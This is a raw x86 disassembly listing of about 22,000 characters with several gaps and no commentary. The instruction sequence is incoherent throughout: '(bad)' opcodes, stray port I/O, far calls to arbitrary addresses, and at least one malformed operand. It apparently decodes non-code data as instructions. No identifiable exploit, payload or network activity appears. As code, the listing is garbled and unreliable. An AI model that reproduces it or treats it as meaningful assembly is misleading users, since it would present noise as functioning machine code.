  41cfbe:	in     eax,dx
  41cfbf:	mov    dh,BYTE PTR [esi]
  41cfc1:	fistp  QWORD PTR [ebp+0x54]
  41cfc4:	jge    0x41cf9a
  41cfc6:	push   eax
  41cfc7:	fcmovnb st,st(2)
  41cfc9:	push   eax
  41cfca:	std    
  41cfcb:	add    edx,DWORD PTR ds:0x3393
  41cfd0:	jp     0x41cfe8
  41cfd2:	dec    esp
  41cfd3:	cdq    
  41cfd4:	sbb    eax,0xcee2ac66
  41cfd9:	out    dx,al
  41cfda:	shr    DWORD PTR [eax+eiz*4],cl
  41cfdd:	rcl    DWORD PTR [esi-0x13],1
  41cfe0:	pop    ecx
  41cfe1:	outs   dx,BYTE PTR ds:[esi]
  41cfe2:	pop    es
  41cfe3:	mov    edi,0xfde2e8b8
  41cfe8:	mov    ds:0xf1753619,eax
  41cfed:	pushf  
  41cfee:	cmp    dh,BYTE PTR [ecx+0x1a]
  41cff1:	ins    DWORD PTR es:[edi],dx
  41cff2:	sti    
  41cff3:	div    BYTE PTR [eax]
  41cff5:	pop    ds
  41cff6:	repnz push ds
  41cff8:	mov    esp,edi
  41cffa:	daa    
  41cffb:	inc    ecx
  41cffc:	adc    DWORD PTR [ebx-0x30],ecx
  41cfff:	fdiv   QWORD PTR [edi+0x58]
  41d002:	stos   BYTE PTR es:[edi],al
  41d003:	in     al,dx
  41d004:	fdiv   QWORD PTR [esi]
  41d006:	loopne 0x41d07e
  41d008:	test   al,0xc4
  41d00a:	xchg   esi,eax
  41d00b:	cld    
  41d00c:	dec    edi
  41d00d:	das    
  41d00e:	dec    edx
  41d00f:	dec    ecx
  41d010:	fdivrp st(1),st
  41d012:	dec    edi
  41d013:	mov    ebx,0xe7bc9c86
  41d018:	jmp    0x1a3c04a3
  41d01d:	jge    0x41cfed
  41d01f:	lds    eax,FWORD PTR [eax-0x1c6d328]
  41d025:	in     eax,0xdc
  41d027:	push   ds
  41d028:	outs   dx,DWORD PTR ds:[esi]
  41d029:	mov    ah,0xbf
  41d02b:	pop    ss
  41d02c:	daa    
  41d02d:	fmul   st,st(7)
  41d02f:	mov    fs,WORD PTR [ebp+0x72]
  41d032:	mov    eax,0x3375c6f
  41d037:	push   ecx
  41d038:	mov    esi,0x11e35335
  41d03d:	sbb    edx,DWORD PTR [ebx]
  41d03f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d040:	sbb    eax,0xc51bfc68
  41d045:	lock shl DWORD PTR [ebx+0xf],cl
  41d049:	aas    
  41d04a:	sbb    eax,0xab38d92f
  41d04f:	(bad)  
  41d050:	aas    
  41d051:	mov    eax,ds:0xc62fdae6
  41d056:	inc    edi
  41d057:	scas   eax,DWORD PTR es:[edi]
  41d058:	stc    
  41d059:	xor    eax,ebx
  41d05b:	scas   al,BYTE PTR es:[edi]
  41d05c:	cmp    ebp,edi
  41d05e:	fiadd  WORD PTR [ebx]
  41d060:	mov    dl,0x3d
  41d062:	sbb    al,0xe3
  41d064:	xor    al,BYTE PTR [ebp-0x14ca7ab9]
  41d06a:	scas   al,BYTE PTR es:[edi]
  41d06b:	dec    esi
  41d06c:	pop    DWORD PTR [eax]
	...
  41d0d6:	mov    ecx,0xad432034
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0x6478b7bd
  41d0e5:	jb     0x41d0ed
  41d0e7:	cmp    BYTE PTR [ecx],al
  41d0e9:	add    bh,bh
  41d0eb:	add    BYTE PTR [eax],al
  41d0ed:	add    ah,bh
  41d0ef:	ins    DWORD PTR es:[edi],dx
  41d0f0:	xchg   ebp,eax
  41d0f1:	fild   WORD PTR [esi-0x689f1d4b]
  41d0f7:	adc    dl,dh
  41d0f9:	mov    edi,0xd25acee5
  41d0fe:	inc    ebx
  41d0ff:	sbb    eax,DWORD PTR [esi+0x71]
  41d102:	into   
  41d103:	cwde   
  41d104:	dec    esi
  41d105:	mov    edx,0x8fc3b88
  41d10a:	mov    ebp,0x91b40b16
  41d10f:	sbb    al,0x57
  41d111:	xor    BYTE PTR [edi],al
  41d113:	mov    eax,ds:0x1d6d7e53
  41d118:	shl    DWORD PTR [ecx+0x733547ca],0xaf
  41d11f:	and    eax,0x3a7d25e
  41d124:	das    
  41d125:	sbb    DWORD PTR [ecx-0x4f927fa2],ebx
  41d12b:	jp     0x41d151
  41d12d:	into   
  41d12e:	jl     0x41d143
  41d130:	stos   DWORD PTR es:[edi],eax
  41d131:	call   0x9f481463
  41d136:	push   edi
  41d137:	sbb    al,0x8b
  41d139:	out    0xc1,al
  41d13b:	loope  0x41d1ab
  41d13d:	(bad)  
  41d13e:	aam    0x5e
  41d140:	mov    dh,0xa3
  41d142:	test   BYTE PTR [edi-0x68],bl
  41d145:	cli    
  41d146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d147:	dec    esp
  41d148:	out    0xf6,eax
  41d14a:	idiv   BYTE PTR [ebx-0x7b]
  41d14d:	retf   0xa266
  41d150:	repnz pop es
  41d152:	and    esp,DWORD PTR [edi]
  41d154:	mov    ds:0xb88e9d3f,eax
  41d159:	sub    al,0xa2
  41d15b:	(bad)  
  41d15c:	push   0x365b0060
  41d161:	push   DWORD PTR [eax-0x71]
  41d164:	sbb    ebx,DWORD PTR [ebx+0x49]
  41d167:	jb     0x41d10d
  41d169:	and    eax,0x48522470
  41d16e:	xor    eax,0x7a4dc71a
  41d173:	mov    WORD PTR [esp+edx*1+0x237182c3],gs
  41d17a:	into   
  41d17b:	mov    ah,0x44
  41d17d:	dec    eax
  41d17e:	xor    al,BYTE PTR [ecx]
  41d180:	lods   eax,DWORD PTR ds:[esi]
  41d181:	(bad)  
  41d182:	mov    edi,0xf50dc3b0
  41d187:	push   edx
  41d188:	hlt    
  41d189:	bound  esp,QWORD PTR [ebx]
  41d18b:	or     DWORD PTR [ebx],edx
  41d18d:	stos   DWORD PTR es:[edi],eax
  41d18e:	adc    DWORD PTR [ebx-0x6e21d924],eax
  41d194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d195:	sbb    BYTE PTR [ebx+0x63],0x48
  41d199:	ret    0x8961
  41d19c:	stc    
  41d19d:	sub    al,0x75
  41d19f:	enter  0x6bb9,0xf0
  41d1a3:	inc    edx
  41d1a4:	dec    edi
  41d1a5:	cmp    bh,ah
  41d1a7:	xchg   BYTE PTR [edx-0x957f216],dh
  41d1ad:	mov    edi,0xe662c19e
  41d1b2:	scas   al,BYTE PTR es:[edi]
  41d1b3:	push   ebp
  41d1b4:	call   0x5be3:0x3f813aeb
  41d1bb:	lahf   
  41d1bc:	mov    ds:0xb94f73b3,al
  41d1c1:	ja     0x41d222
  41d1c3:	mov    BYTE PTR ds:0xed84588f,ah
  41d1c9:	bound  ebp,QWORD PTR [ecx]
  41d1cb:	mov    ebp,0xce165e2e
  41d1d0:	xchg   esi,eax
  41d1d1:	loop   0x41d192
  41d1d3:	ret    0x2508
  41d1d6:	xchg   esi,eax
  41d1d7:	xor    DWORD PTR [esi],edi
  41d1d9:	fidiv  DWORD PTR [edx+0x56df6b9c]
  41d1df:	xor    ah,BYTE PTR [ebx]
  41d1e1:	cmp    BYTE PTR [edx],dh
  41d1e3:	sbb    eax,0x51cee716
  41d1e8:	repz scas eax,DWORD PTR es:[edi]
  41d1ea:	repz inc DWORD PTR gs:[eax]
	...
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	pop    ebx
  41d263:	in     al,dx
  41d264:	mov    al,ds:0x13905c9
  41d269:	add    bh,bh
  41d26b:	add    BYTE PTR [eax],al
  41d26d:	add    BYTE PTR [ebx+0x5041b575],bh
  41d273:	push   ds
  41d274:	dec    esi
  41d275:	jg     0x41d268
  41d277:	test   eax,0xe26559fa
  41d27c:	shl    dl,0x8
  41d27f:	les    esp,FWORD PTR [ecx+0x4d]
  41d282:	or     ah,BYTE PTR [ecx+ebp*4]
  41d285:	xchg   esi,eax
  41d286:	stos   DWORD PTR es:[edi],eax
  41d287:	mov    bh,0xe8
  41d289:	int    0xe3
  41d28b:	xchg   BYTE PTR cs:[eax],cl
  41d28e:	mov    cl,0xb7
  41d290:	rol    BYTE PTR [edi+0x57ea4242],0x2c
  41d297:	xchg   DWORD PTR [ebp+0x4a],ecx
  41d29a:	mov    ebx,0xebc0f60c
  41d29f:	dec    ecx
  41d2a0:	xor    dl,dh
  41d2a2:	inc    eax
  41d2a3:	scas   eax,DWORD PTR es:[edi]
  41d2a4:	adc    ebp,DWORD PTR [edx+esi*4]
  41d2a7:	pop    ecx
  41d2a8:	aaa    
  41d2a9:	push   cs
  41d2aa:	xchg   esi,eax
  41d2ab:	outs   dx,DWORD PTR ds:[esi]
  41d2ac:	ins    DWORD PTR es:[edi],dx
  41d2ad:	loop   0x41d238
  41d2af:	pop    ecx
  41d2b0:	xchg   esi,eax
  41d2b1:	xchg   ecx,eax
  41d2b2:	xor    ebp,ebx
  41d2b4:	or     al,0xf3
  41d2b6:	inc    ebx
  41d2b7:	jnp    0x41d2d4
  41d2b9:	inc    ebp
  41d2ba:	or     dh,BYTE PTR [edx-0x82df6d1]
  41d2c0:	add    ecx,DWORD PTR [eax]
  41d2c2:	mov    ds:0xab5190e9,al
  41d2c7:	inc    edx
  41d2c8:	lds    edi,FWORD PTR ds:0x1ca86d5e
  41d2ce:	inc    ebx
  41d2cf:	or     ch,BYTE PTR [ebp+0x3f]
  41d2d2:	adc    ch,BYTE PTR [eax-0x55d1ce1]
  41d2d8:	popa   
  41d2d9:	xor    cl,bl
  41d2db:	aaa    
  41d2dc:	jmp    0x41d2ff
  41d2de:	out    dx,al
  41d2df:	in     eax,dx
  41d2e0:	mov    WORD PTR [ebp-0x16402c7d],fs
  41d2e6:	or     DWORD PTR [ebx+ebx*4-0xceb0bb4],edi
  41d2ed:	mov    cl,0x8b
  41d2ef:	test   eax,0xaee5c7d
  41d2f4:	mov    ebx,0xdd3fccc2
  41d2f9:	jo     0x41d33c
  41d2fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2fc:	and    BYTE PTR [ecx],dh
  41d2fe:	mov    eax,0xd5342736
  41d303:	sbb    dh,BYTE PTR [ebp-0x607b1bf4]
  41d309:	mov    eax,0xf9107b9e
  41d30e:	mov    ah,0xd5
  41d310:	gs in  eax,0x6d
  41d313:	sbb    DWORD PTR [edx+0x4e45cb4f],0x7add1806
  41d31d:	dec    ecx
  41d31e:	shr    BYTE PTR [ebx],0xc0
  41d321:	adc    ecx,esi
  41d323:	je     0x41d2f7
  41d325:	mov    eax,0x922ab07d
  41d32a:	aad    0xd4
  41d32c:	je     0x41d326
  41d32e:	cmp    edx,esi
  41d330:	mov    edx,0xcb289a59
  41d335:	std    
  41d336:	into   
  41d337:	sbb    DWORD PTR [ebx+0x66],ebp
  41d33a:	cmp    eax,0xb695b86f
  41d33f:	xor    eax,0x3f5d98dd
  41d344:	mov    al,ds:0xa962e411
  41d349:	mov    bl,cl
  41d34b:	mov    al,0x5b
  41d34d:	push   ebx
  41d34e:	shr    dh,1
  41d350:	sbb    al,0x2e
  41d352:	jae    0x41d3cc
  41d354:	xor    al,BYTE PTR [ebp-0x2c]
  41d357:	imul   eax,DWORD PTR [esi+0x6c],0xffffffde
  41d35b:	clc    
  41d35c:	pop    es
  41d35d:	sub    ch,BYTE PTR [esi+0x46]
  41d360:	mov    ch,0x85
  41d362:	data16 jo 0x41d3a8
  41d365:	fdiv   DWORD PTR [eax]
  41d367:	mov    al,0xe8
  41d369:	nop
  41d36a:	adc    ebp,DWORD PTR [eax]
  41d36c:	push   edx
	...
  41d3d5:	add    dh,bh
  41d3d7:	cmp    cl,0x54
  41d3da:	(bad)  
  41d3db:	jge    0x41d3dc
  41d3dd:	stos   BYTE PTR es:[edi],al
  41d3de:	lea    ebp,[edi]
  41d3e0:	shr    BYTE PTR [ecx-0x62],0xf
  41d3e4:	je     0x41d449
  41d3e6:	add    al,0x3a
  41d3e8:	add    DWORD PTR [eax],eax
  41d3ea:	inc    DWORD PTR [eax]
  41d3ec:	add    BYTE PTR [eax],al
  41d3ee:	cs in  al,dx
  41d3f0:	out    0xae,al
  41d3f2:	loop   0x41d451
  41d3f4:	xchg   dh,cl
  41d3f6:	adc    eax,DWORD PTR [ebx+0x48cabdc1]
  41d3fc:	fldln2 
  41d3fe:	scas   al,BYTE PTR es:[edi]
  41d3ff:	lds    edx,FWORD PTR [edi]
  41d401:	push   ds
  41d402:	mov    esp,0x57aa85d8
  41d407:	sbb    BYTE PTR [ebp+0x2977cf9d],0x71
  41d40e:	cmc    
  41d40f:	cmp    eax,DWORD PTR [ecx+0x49]
  41d412:	inc    edi
  41d413:	pop    esp
  41d414:	pop    ds
  41d415:	rcl    DWORD PTR [ebp-0x40],1
  41d418:	loopne 0x41d3b4
  41d41a:	pextrw esp,mm5,0x53
  41d41e:	inc    ebx
  41d41f:	fucomip st,st(2)
  41d421:	jg     0x41d492
  41d423:	test   al,0x56
  41d425:	jle    0x41d3cd
  41d427:	sahf   
  41d428:	push   ss
  41d429:	push   edi
  41d42a:	ror    DWORD PTR [ecx+0x64],0xa9
  41d42e:	aam    0xcc
  41d430:	xor    ebp,eax
  41d432:	adc    dh,ch
  41d434:	imul   DWORD PTR [eax+0x29]
  41d437:	inc    esi
  41d438:	sub    dh,BYTE PTR [edx+0x1de20a5f]
  41d43e:	mov    ch,0xf9
  41d440:	fsub   DWORD PTR [edi+0x4]
  41d443:	aas    
  41d444:	adc    eax,0x4d3e474a
  41d449:	and    DWORD PTR [ebx+0x2b9d50ae],0xffffffa6
  41d450:	pop    esi
  41d451:	mov    dl,0x3
  41d453:	push   ecx
  41d454:	inc    edx
  41d455:	addr16 (bad) 
  41d457:	outs   dx,DWORD PTR ds:[esi]
  41d458:	cmp    bh,BYTE PTR [edi+0x4c]
  41d45b:	push   edx
  41d45c:	outs   dx,BYTE PTR ds:[esi]
  41d45d:	fcom   QWORD PTR [edx]
  41d45f:	out    dx,eax
  41d460:	retfw  
  41d462:	push   ds
  41d463:	pop    ebx
  41d464:	imul   ecx,DWORD PTR [eax+eax*1],0x44e80772
  41d46b:	xchg   ebp,eax
  41d46c:	mov    bh,0xa2
  41d46e:	pop    esp
  41d46f:	leave  
  41d470:	cmp    BYTE PTR [edx],bh
  41d472:	outs   dx,BYTE PTR ds:[esi]
  41d473:	mov    ah,0x9c
  41d475:	cmpxchg DWORD PTR [ebp-0x17240bb0],esp
  41d47c:	adc    BYTE PTR [edi+0x18],al
  41d47f:	sti    
  41d480:	mov    ecx,ebx
  41d482:	out    dx,al
  41d483:	aad    0x93
  41d485:	sbb    ebp,DWORD PTR [edx]
  41d487:	xchg   ebx,eax
  41d488:	mov    BYTE PTR [ecx-0x2dc4c911],0xc0
  41d48f:	in     al,dx
  41d490:	test   DWORD PTR [edx+edx*1+0xc],esp
  41d494:	stos   BYTE PTR es:[edi],al
  41d495:	icebp  
  41d496:	pop    ebp
  41d497:	aad    0x8b
  41d499:	pop    ebx
  41d49a:	arpl   WORD PTR [ecx+edx*8],sp
  41d49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d49e:	xor    edx,ebx
  41d4a0:	fimul  DWORD PTR [ecx]
  41d4a2:	jmp    0x41d46c
  41d4a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4a5:	fild   QWORD PTR [eax+0x6d]
  41d4a8:	iret   
  41d4a9:	lods   al,BYTE PTR ds:[esi]
  41d4aa:	jmp    0x730b:0x88e8ebd2
  41d4b1:	loopne 0x41d4dd
  41d4b3:	push   es
  41d4b4:	out    dx,eax
  41d4b5:	push   es
  41d4b6:	and    al,0x73
  41d4b8:	pop    ss
  41d4b9:	imul   edi,DWORD PTR [edi+0x7aee41a0],0xcd7f37
  41d4c3:	jecxz  0x41d47b
  41d4c5:	mov    ebp,0x4db33b21
  41d4ca:	in     al,dx
  41d4cb:	mov    esi,0xc07994c2
  41d4d0:	enter  0x3939,0x30
  41d4d4:	mov    edi,0xcbb8fa51
  41d4d9:	xchg   ecx,eax
  41d4da:	into   
  41d4db:	ret    
  41d4dc:	pop    ebp
  41d4dd:	pop    ds
  41d4de:	jno    0x41d502
  41d4e0:	(bad)  
  41d4e2:	retf   
  41d4e3:	ss popa 
  41d4e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4e6:	cmp    esi,DWORD PTR ds:0xe6d42cbf
  41d4ec:	pop    esi
	...
  41d555:	add    dh,dh
  41d557:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x3ce:0x249f5989
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    bh,bh
  41d56b:	add    BYTE PTR [eax],al
  41d56d:	add    BYTE PTR [edx+0x770c0cbb],cl
  41d573:	sub    bl,BYTE PTR [esi]
  41d575:	jle    0x41d540
  41d577:	cmp    BYTE PTR [edi+ecx*2+0x3a],ch
  41d57b:	iret   
  41d57c:	cmp    eax,edx
  41d57e:	add    cl,BYTE PTR [edx+ebp*8-0x2a]
  41d582:	call   0xb030:0xfaaa9af0
  41d589:	and    ah,BYTE PTR [edx]
  41d58b:	mov    esp,0x106ea4fa
  41d590:	enter  0x4d83,0x6b
  41d594:	pop    ebx
  41d595:	xchg   BYTE PTR [ebp+0x50],dh
  41d598:	popf   
  41d599:	leave  
  41d59a:	into   
  41d59b:	test   al,0x10
  41d59d:	push   ebx
  41d59e:	out    dx,al
  41d59f:	fcom   st(2)
  41d5a1:	dec    esp
  41d5a2:	xchg   ecx,eax
  41d5a3:	sbb    esp,DWORD PTR [esi*4-0x54a47129]
  41d5aa:	sbb    BYTE PTR [eax],0x81
  41d5ad:	fwait
  41d5ae:	xor    ah,ah
  41d5b0:	fwait
  41d5b1:	jb     0x41d5ec
  41d5b3:	adc    al,0x22
  41d5b5:	pop    esp
  41d5b6:	jmp    0x79545f62
  41d5bb:	popf   
  41d5bc:	push   0x50972765
  41d5c1:	mov    ch,0xe1
  41d5c3:	or     ecx,DWORD PTR [ecx+0x6d5899ae]
  41d5c9:	mov    dl,0x86
  41d5cb:	or     BYTE PTR [ebx+eiz*2+0x9],cl
  41d5cf:	add    eax,0xd79b5f33
  41d5d4:	pusha  
  41d5d5:	xor    dh,BYTE PTR [esi]
  41d5d7:	mov    BYTE PTR [ebx-0x70103611],al
  41d5dd:	stos   BYTE PTR es:[edi],al
  41d5de:	xchg   ebx,eax
  41d5df:	mov    dh,0xf9
  41d5e1:	inc    edx
  41d5e2:	push   edx
  41d5e3:	fwait
  41d5e4:	ret    
  41d5e5:	sbb    eax,0xcdab9f2a
  41d5ea:	cmp    BYTE PTR [ebx],bh
  41d5ec:	cmp    eax,edi
  41d5ee:	pop    ebx
  41d5f0:	sub    esp,esi
  41d5f2:	fidiv  DWORD PTR [bx+di]
  41d5f5:	repz jle 0x41d5d4
  41d5f8:	mov    ds:0xfaec2633,eax
  41d5fd:	test   al,0x81
  41d5ff:	mov    WORD PTR [edx+0x52810402],gs
  41d605:	xchg   ecx,eax
  41d606:	adc    BYTE PTR [eax],0xc
  41d609:	xor    BYTE PTR [esp+ebx*2+0x6c4e3e04],0x7f
  41d611:	into   
  41d612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d613:	popa   
  41d614:	mov    BYTE PTR [edx-0x481e5bd2],dh
  41d61a:	sbb    ebx,ecx
  41d61c:	push   esi
  41d61d:	sub    ebp,DWORD PTR [eax]
  41d61f:	js     0x41d6a0
  41d621:	push   ds
  41d622:	sub    DWORD PTR [eax],esp
  41d624:	mov    bh,0x4e
  41d626:	ins    BYTE PTR es:[edi],dx
  41d627:	mov    al,0x34
  41d629:	jae    0x41d5ad
  41d62b:	mul    DWORD PTR [esi-0x30]
  41d62e:	and    BYTE PTR [esi-0x6017e1f1],0x34
  41d635:	adc    dh,bh
  41d637:	je     0x41d626
  41d639:	sbb    DWORD PTR [eax],eax
  41d63b:	inc    eax
  41d63c:	test   di,0x79db
  41d641:	loope  0x41d69f
  41d643:	push   ecx
  41d644:	xor    DWORD PTR [ebx+0x6a4e17e6],edi
  41d64a:	add    dh,dh
  41d64c:	and    DWORD PTR [edx+0x31],0x79dc6907
  41d653:	daa    
  41d654:	and    BYTE PTR [ebx-0x70ee4a37],al
  41d65a:	mov    eax,0x5a0e418f
  41d65f:	cmp    edi,0x366fd379
  41d665:	lds    esp,FWORD PTR [ecx-0x6e]
  41d668:	push   0xac5cbe52
	...
  41d6d5:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x5766e435
  41d6e3:	movq   mm6,QWORD PTR [edx+0x13c02]
  41d6ea:	inc    DWORD PTR [eax]
  41d6ec:	add    BYTE PTR [eax],al
  41d6ee:	jmp    0x63b4:0x8349273
  41d6f5:	jmp    DWORD PTR [ecx]
  41d6f7:	push   ds
  41d6f8:	in     eax,0xf0
  41d6fa:	push   ebx
  41d6fb:	hlt    
  41d6fc:	int    0x52
  41d6fe:	neg    BYTE PTR [esi+0x4c794683]
  41d704:	test   DWORD PTR [edi+0x1b1e5b70],0x94ec44a5
  41d70e:	pop    ds
  41d70f:	das    
  41d710:	shl    BYTE PTR [eax+0x7e],0x2d
  41d714:	adc    eax,0xda152086
  41d719:	mov    DWORD PTR [edx+0x66],eax
  41d71c:	mov    ds:0xb99c5fae,al
  41d721:	call   0x3153705c
  41d726:	test   BYTE PTR [ecx-0x4d],al
  41d729:	xor    BYTE PTR [edx],0x6e
  41d72c:	push   DWORD PTR [edi-0x7b]
  41d72f:	inc    esi
  41d730:	cmp    eax,0x2ef62744
  41d735:	sbb    DWORD PTR [eax],ecx
  41d737:	or     eax,DWORD PTR [eax-0x51]
  41d73a:	cmp    al,0x31
  41d73c:	adc    DWORD PTR [eax],eax
  41d73e:	xor    al,0xa2
  41d740:	push   ecx
  41d741:	cmp    al,0xab
  41d743:	mov    esp,DWORD PTR [esp+eiz*4]
  41d746:	imul   DWORD PTR [edi]
  41d748:	shl    BYTE PTR [esi],0xa1
  41d74b:	push   0x25b00194
  41d750:	fs cli 
  41d752:	push   ecx
  41d753:	mov    es,WORD PTR [ecx+0x4d]
  41d756:	psraw  mm5,mm5
  41d759:	push   0x774ad2ea
  41d75e:	xor    eax,0xa37853ff
  41d763:	mov    esi,0xb00aed3a
  41d768:	rcl    DWORD PTR [ebx+0x4],1
  41d76b:	into   
  41d76c:	fld    DWORD PTR [edx-0x49]
  41d76f:	rcl    esi,1
  41d771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d772:	xchg   DWORD PTR [edi-0x35d27a81],ebx
  41d778:	stos   DWORD PTR es:[edi],eax
  41d779:	xor    edi,DWORD PTR [edi+edx*2-0x33]
  41d77d:	nop
  41d77e:	mov    dl,0xb3
  41d780:	cmp    al,0x71
  41d782:	fwait
  41d783:	xchg   ecx,eax
  41d784:	cmp    ebp,DWORD PTR ds:0x1549034d
  41d78a:	mov    eax,ds:0x4a6e55e4
  41d78f:	ins    BYTE PTR es:[edi],dx
  41d790:	adc    BYTE PTR [edi+0x4b158374],dh
  41d796:	aaa    
  41d797:	in     eax,0x2e
  41d799:	mov    al,ds:0xf90985dc
  41d79e:	shl    DWORD PTR [eax+0x30],cl
  41d7a1:	or     BYTE PTR [ebx+0x2ca2310a],ch
  41d7a7:	push   ebp
  41d7a8:	xor    eax,0xd02b611d
  41d7ad:	inc    ecx
  41d7ae:	pusha  
  41d7af:	inc    edi
  41d7b0:	push   0x1662b591
  41d7b5:	xchg   esp,eax
  41d7b6:	call   0xc6b618fc
  41d7bb:	push   esi
  41d7bc:	sub    bl,BYTE PTR [edx+0x12ee3812]
  41d7c2:	pushf  
  41d7c3:	fisttp WORD PTR [ecx-0x32]
  41d7c6:	popf   
  41d7c7:	rep stos DWORD PTR es:[edi],eax
  41d7c9:	retf   0x8ccd
  41d7cc:	pop    esp
  41d7cd:	push   edx
  41d7ce:	fwait
  41d7cf:	(bad)  
  41d7d0:	lods   al,BYTE PTR ds:[esi]
  41d7d1:	int3   
  41d7d2:	or     ebx,edi
  41d7d4:	out    0x2d,eax
  41d7d6:	dec    ebp
  41d7d7:	outs   dx,DWORD PTR ds:[esi]
  41d7d8:	(bad)  
  41d7d9:	jno    0x41d7ba
  41d7db:	push   ecx
  41d7dc:	fs sub ebp,ebp
  41d7df:	js     0x41d860
  41d7e1:	test   al,0x6b
  41d7e3:	xchg   ebp,eax
  41d7e4:	cwde   
  41d7e5:	dec    ecx
  41d7e6:	mov    dh,ah
  41d7e8:	cmc    
  41d7e9:	adc    eax,0xa4d0bb
	...
  41d856:	and    al,0xce
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	sbb    al,BYTE PTR [eax]
  41d864:	lods   eax,DWORD PTR ds:[esi]
  41d865:	aam    0x1
  41d867:	cmp    eax,0xff0001
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	push   esp
  41d86f:	bound  ebp,QWORD PTR [ebx+edx*4]
  41d872:	int3   
  41d873:	adc    DWORD PTR [esi-0x36],0xb644d02b
  41d87a:	js     0x41d87c
  41d87c:	dec    esi
  41d87d:	cmp    eax,0x6560c6a7
  41d882:	ins    DWORD PTR es:[edi],dx
  41d883:	pop    es
  41d884:	fist   DWORD PTR [eax-0x42dbac64]
  41d88a:	mov    edi,0x440c10f4
  41d88f:	(bad)  
  41d890:	jp     0x41d88f
  41d892:	xor    bh,al
  41d894:	push   ebp
  41d895:	xor    al,0xf0
  41d897:	jg     0x41d8c9
  41d899:	in     al,0x35
  41d89b:	mov    ebx,0xee9da0ce
  41d8a0:	xor    esi,ecx
  41d8a2:	lea    ebx,[eax+ebp*2]
  41d8a5:	push   0x663b29b0
  41d8aa:	mov    ch,0xdc
  41d8ac:	adc    dh,BYTE PTR [edx]
  41d8ae:	inc    eax
  41d8af:	mov    edx,0x79b810d1
  41d8b4:	imul   esi,DWORD PTR ds:0xd00604e7,0x8bb3f01f
  41d8be:	fucomip st,st(2)
  41d8c0:	sbb    dh,al
  41d8c2:	xchg   esi,eax
  41d8c3:	sar    BYTE PTR [esi],1
  41d8c5:	pop    ecx
  41d8c6:	test   BYTE PTR [esi],cl
  41d8c8:	inc    esi
  41d8c9:	pusha  
  41d8ca:	arpl   si,di
  41d8cc:	out    0x58,eax
  41d8ce:	stos   BYTE PTR es:[edi],al
  41d8cf:	stos   BYTE PTR es:[edi],al
  41d8d0:	add    al,0x9d
  41d8d2:	add    al,0xb
  41d8d4:	xchg   ecx,eax
  41d8d5:	call   0x6a31:0xd16407b9
  41d8dc:	sbb    BYTE PTR [ebp-0x15b64e1d],cl
  41d8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8e3:	fst    DWORD PTR [ebx-0x75]
  41d8e6:	mov    ds:0xba604cf3,eax
  41d8eb:	test   DWORD PTR [esp+ebx*1+0x3f],edx
  41d8ef:	in     eax,0x70
  41d8f1:	into   
  41d8f2:	mov    bl,0xa5
  41d8f4:	push   cs
  41d8f5:	mov    edi,DWORD PTR [ecx-0x4b87eb36]
  41d8fb:	stc    
  41d8fc:	cwde   
  41d8fd:	mov    fs,ecx
  41d8ff:	idiv   DWORD PTR [eax]
  41d901:	scas   al,BYTE PTR es:[edi]
  41d902:	pop    edi
  41d903:	mov    ecx,0x8809069d
  41d908:	out    0xab,al
  41d90a:	outs   dx,DWORD PTR ds:[esi]
  41d90b:	es iret 
  41d90d:	adc    dh,ch
  41d90f:	and    BYTE PTR [edi+ebx*4-0x23036c8f],ah
  41d916:	xchg   ebx,eax
  41d917:	pop    esi
  41d918:	or     dl,BYTE PTR [eax+0x171a95d0]
  41d91e:	int3   
  41d91f:	xchg   esi,eax
  41d920:	pusha  
  41d921:	shl    DWORD PTR [esi+0x35843aa9],0x31
  41d928:	outs   dx,DWORD PTR ds:[esi]
  41d929:	dec    edi
  41d92a:	push   ecx
  41d92b:	jno    0x41d9ab
  41d92d:	jmp    0x41d91b
  41d92f:	and    al,0x2a
  41d931:	mov    ch,0x3f
  41d933:	xor    eax,0xa84cd4e7
  41d938:	test   eax,0xaeb52ea2
  41d93d:	mov    eax,ds:0xff43ef2
  41d942:	cmp    dl,dh
  41d944:	fdivrp st(6),st
  41d946:	stos   BYTE PTR es:[edi],al
  41d947:	fwait
  41d948:	call   0x2ef6:0xf5b40a02
  41d94f:	call   0x8d6693b3
  41d954:	adc    eax,0x7d569e43
  41d959:	in     eax,0x15
  41d95b:	inc    esp
  41d95c:	ret    
  41d95d:	push   ebx
  41d95e:	pusha  
  41d95f:	cmp    eax,0x27e8497b
  41d964:	mov    WORD PTR [esi+0x65],?
  41d967:	inc    eax
  41d968:	jg     0x41d9b6
  41d96a:	mov    eax,0x424c
	...
  41d9d3:	add    BYTE PTR [eax],al
  41d9d5:	add    ah,al
  41d9d7:	ins    BYTE PTR es:[edi],dx
  41d9d8:	pop    es
  41d9d9:	pushf  
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	gs mov dl,0xf1
  41d9e4:	xchg   edi,eax
  41d9e5:	or     al,0x0
